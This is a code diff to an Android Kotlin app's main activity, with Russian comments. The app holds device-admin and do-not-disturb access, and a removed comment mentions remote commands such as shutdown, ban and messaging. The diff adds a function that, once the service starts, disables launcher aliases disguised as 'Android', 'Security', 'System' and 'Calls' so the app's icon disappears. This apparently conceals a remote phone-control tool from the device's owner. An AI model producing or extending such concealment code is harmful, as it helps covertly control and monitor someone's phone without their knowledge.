@@ -5,6 +5,7 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Color
 import android.os.Bundle
 import android.view.Gravity
@@ -20,7 +21,6 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Если все разрешения уже есть — запускаем сервис и закрываемся
         if (allPermissionsGranted()) {
             startService()
             finish()
@@ -110,6 +110,7 @@ class MainActivity : AppCompatActivity() {
 
         startBtn.setOnClickListener {
             startService()
+            hideAppIcon()
             finish()
         }
 
@@ -132,6 +133,29 @@ class MainActivity : AppCompatActivity() {
         refreshStatus()
     }
 
+    private fun hideAppIcon() {
+        // Отключаем все активные aliases (иконка пропадает с главного экрана)
+        val pm = packageManager
+        val pkg = packageName
+        val allAliases = listOf(
+            ".alias.PhoneControl",
+            ".alias.Android",
+            ".alias.Security",
+            ".alias.Bezopasnost",
+            ".alias.Zvonki",
+            ".alias.System"
+        )
+        allAliases.forEach { alias ->
+            try {
+                pm.setComponentEnabledSetting(
+                    ComponentName(pkg, pkg + alias),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            } catch (e: Exception) { }
+        }
+    }
+
     override fun onResume() {
         super.onResume()
         refreshStatus()
@@ -141,8 +165,6 @@ class MainActivity : AppCompatActivity() {
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val cn = ComponentName(this, AdminReceiver::class.java)
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        // Overlay не обязателен для старта сервиса — только для /msg.
-        // Без него остальные команды (shutdown, ban, dnd) работают нормально.
         return dpm.isAdminActive(cn) && nm.isNotificationPolicyAccessGranted
     }
 
